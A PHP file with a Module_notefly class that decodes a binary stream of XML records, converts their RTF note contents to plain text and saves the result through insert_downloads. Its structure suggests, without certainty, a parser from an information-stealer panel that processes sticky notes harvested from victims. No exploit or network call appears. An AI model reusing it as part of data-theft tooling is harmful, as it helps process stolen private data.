<?php
class Module_notefly extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:

            $Stream = new Stream($Data);

            $Result = '';
            while(TRUE)
            {
                if($Stream->GetDWORD() === NULL)
                    break;

                $Buffer = $Stream->getBINARY_();
                if($Buffer == NULL)
                    break;

                $XML_ = simplexml_load_string($Buffer);
                if($XML_)
                {
                    if(isset($XML_->content))
                    {
                        $FileDeB = GetTempFile('Stick');
                        file_put_contents($FileDeB, $XML_->content);
						
                        $rtf = new RTFConverter($FileDeB);
                        $Result .= $rtf->convertToPlainText() . "\r\n";
						$rtf  = NULL;
                        $Result .= str_pad("", 30, "-") . "\r\n";
						unlink($FileDeB);
                    }
                    $XML_ = NULL;
                }
            }
			
            $this->insert_downloads(substr($Result, 0, 20) . ".txt", $Result);
			$Stream = $Result = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

class RTFConverter{
	//defines error messages
	const ERR_FILE_READ = 'There was a problem reading the RTF file';
	const ERR_EMPTY_FILE = 'The RTF file provided is empty';
	const ERR_NOT_RTF_MIME = 'The file provided is not of a valid RTF file type';
	const ERR_NOT_RTF_EXT = 'The file provided is not an RTF file. Try adding .rtf as an extention';

	//a property to store rtf text from the file provided
	public $rtf;
	
	//the construction method to read the file provided
	public function __construct($file){
		//gets the mime type of the provided file (if possible)
		$file_mime = $this->getMimeType($file);
		$is_rtf = $this->isRTF($file_mime);

		//if the file mime type is determied and the type id in fact an RTF
		if(false !== $file_mime && $is_rtf){
			$valid_type = true;
		}
		//if the file mime type is determined but it is not RTF show error
		else if(false !== $file_mime && !$is_rtf){
			$valid_type = false;
			$this->showError(self::ERR_NOT_RTF_MIME);
		}
		//if the file mime type is not determined find the file extention
		else if(false === $file_mime){
			//gets the file extention
			$file_info = new SplFileInfo($file);
			if('rtf' == strtolower($file_info->getExtension())){
				$valid_type = true;
			}
			else{
				$valid_type = false;
				$this->showError(self::ERR_NOT_RTF_EXT);
			}
		}
		else{
			$valid_type = false;
		}

		//proceed is the file type is a valid RTF type or at least extention
		if($valid_type){
			//reads the content of provided file and store it in $rtf property
			$this->rtf = @file_get_contents($file);
			//checks if the file is read successfully
			if(false === $this->rtf){
				$this->showError(self::ERR_FILE_READ);
			}
			else if(0 == strlen(trim($this->rtf))){
				$this->showError(self::ERR_EMPTY_FILE);
			}
		}
	}
	
	//converts RTF string to plain text
	public function convertToPlainText(){
		$error___ = error_reporting(0);
		$plain_text = "";
	
		$text = $this->rtf;	

		//empty stack array
		$stack = array();
		$j = -1;

		//reads the rtf string character by character
		for ($i = 0, $len = strlen($text); $i < $len; $i++) {
			$char = $text[$i];

			//check some cases of the character and process based on that case
			switch ($char) {
				//first case: the char is a backslash
				case "\\":
					//gets the next character
					$next_char  = $text[$i + 1];

					//if the next char is a backslash and the chat is plain text, so adds it to plain text string
					if($next_char  == '\\' && $this->isPlainText($stack[$j])){
						$plain_text .= '\\';
					}
					//if the next char is telda add space to the plain text string
					elseif ($next_char  == '~' && $this->isPlainText($stack[$j])){
						$plain_text .= ' ';
					}
					//if the next char is underscore, then add hyphen
					elseif ($next_char  == '_' && $this->isPlainText($stack[$j])){
						$plain_text .= '-';
					}
					//if the next char is an asterisk mark, add it to the stack array
					elseif ($next_char  == '*'){
						$stack[$j]["*"] = true;
					}
					//if the next char is a single quote, then read the next 2 chars and get the hexadecimal notation
					elseif ($next_char  == "'") {
						$hex = substr($text, $i + 2, 2);
						if ($this->isPlainText($stack[$j])){
							//adds the hexadecimal notation to th eplain text
							$plain_text .= html_entity_decode("&#".hexdec($hex).";");
						}
						//moves the pointer forward by 2
						$i += 2;
					}
					//now ccheck if the next char is an alphabetic char
					elseif ($next_char  >= 'a' && $next_char  <= 'z' || $next_char  >= 'A' && $next_char  <= 'Z') {
						//to store the control word
						$word = "";
						$param = null;

						//read the chars after the backslash and continue until the whole control word is read (until a digit is read)
						for ($k = $i + 1, $m = 0; $k < strlen($text); $k++, $m++) {
							$next_char = $text[$k];
							
							//checks if the next char is still an alphabetic char
							if ($next_char  >= 'a' && $next_char  <= 'z' || $next_char  >= 'A' && $next_char  <= 'Z') {
								if (empty($param)){
									//add tha char as part of the control word
									$word .= $next_char;
								}
								else{
									break;
								}
							}
							//If it is a digit, store the parameter
							elseif ($next_char  >= '0' && $next_char  <= '9'){
								$param .= $next_char ;
							}
							//for minus sign, check if the param is empty, otherwise its the end of control word
							elseif ($next_char  == '-') {
								if (empty($param)){
									$param .= $next_char ;
								}
								else{
									break;
								}
							}
							else{
								break;
							}
						}
						//shifts the pointer for the read chars
						$i += $m - 1;

						//processes the control word that was read
						//stroes the converted control word
						$cw2text = "";
						switch (strtolower($word)) {
							//unicode case: the control word is a 'u' convert the param to unicode
							case "u":
								$cw2text .= html_entity_decode("&#x".dechex($param).";");
								$ucDelta = @$stack[$j]["uc"];
								if ($ucDelta > 0)
									$i += $ucDelta;
								break;
							//line feeds, spaces and tabs cases:
							case "par": case "page": case "column": case "line": case "lbr":
								$cw2text .= "\n";
								break;
							case "emspace": case "enspace": case "qmspace":
								$cw2text .= " ";
								break;
							case "tab":
								$cw2text .= "\t";
								break;
							//date and time cases:
							case "chdate":
								$cw2text .= date("m.d.Y");
								break;
							case "chdpl":
								$cw2text .= date("l, j F Y");
								break;
							case "chdpa":
								$cw2text .= date("D, j M Y");
								break;
							case "chtime":
								$cw2text .= date("H:i:s");
								break;
							//other html chars cases
							case "emdash":
								$cw2text .= html_entity_decode("&mdash;");
								break;
							case "endash":
								$cw2text .= html_entity_decode("&ndash;");
								break;
							case "bullet":
								$cw2text .= html_entity_decode("&#149;");
								break;
							case "lquote":
								$cw2text .= html_entity_decode("&lsquo;");
								break;
							case "rquote":
								$cw2text .= html_entity_decode("&rsquo;");
								break;
							case "ldblquote": 
								$cw2text .= html_entity_decode("&laquo;");
								break;
							case "rdblquote":
								$cw2text .= html_entity_decode("&raquo;");
								break;
							//all other control word stack if the control word has no params
							default:
								$stack[$j][strtolower($word)] = empty($param) ? true : $param;
								break;
						}
						//adds the converted control word result to the plain text if neccessary
						if ($this->isPlainText($stack[$j])){
							$plain_text .= $cw2text;
						}
					}

					$i++;
					break;
				//second case: if the opening char { is read
				case "{":
					//adds new stack element and adds the previous stack element to it
					array_push($stack, $stack[$j++]);
					break;
				//third case: if the closing char } is read
				case "}":
					//the end of a subgroup is reached. so remove the last stack element
					array_pop($stack);
					$j--;
					break;
				//skip garbage char
				case '\0': case '\r': case '\f': case '\n':
					break;
				//adds other chars to the plain text
				default:
					if ($this->isPlainText($stack[$j])){
						$plain_text .= $char;
					}
					break;
			}
		}

		//stores plain text in the plain text property
		$this->plain_text = $plain_text;
		//returns plain text string
		
		error_reporting($error___);
		return $plain_text;
	}

	//cheks if rtf string is a plain text
	private function isPlainText($s) {
		$control_words = array("*", "fonttbl", "colortbl", "datastore", "themedata");
		for ($i = 0; $i < count($control_words); $i++){
			if(!empty($s[$control_words[$i]])){
				return false;
			}
		}
		return true;
	} 

	private function getMimeType($file){
		//uses the file info PECL extention to return the mime type
		if(function_exists('finfo_file')) {
			$file_info = @finfo_open(FILEINFO_MIME_TYPE);
			$mime = @finfo_file($file_info, $file);
			finfo_close($file_info);
			return $mime;
		}
		//if file info is not installed uses mime_content_type function (depricated)
		else if(function_exists("mime_content_type")) {
			return @mime_content_type($file);
		}
		//if the function is depricated and cannot be used, uses shell_exec if its not disabled
		else if (!stristr(ini_get("disable_functions"), "shell_exec")) {
			$file = escapeshellarg($file);
			$mime = shell_exec("file -bi " . $file);
			return $mime;
		}
		//if none of the above works then return false
		else {
			return false;
		}
	}

	//checks if mime type is an RTF
	private function isRTF($mime){
		return preg_match('/(application|text)\/(x-)?(rtf|richtext)$/i', $mime);
	}

	//displays error messages
	private function showError($err){
		//echo $err."\n";
	}
}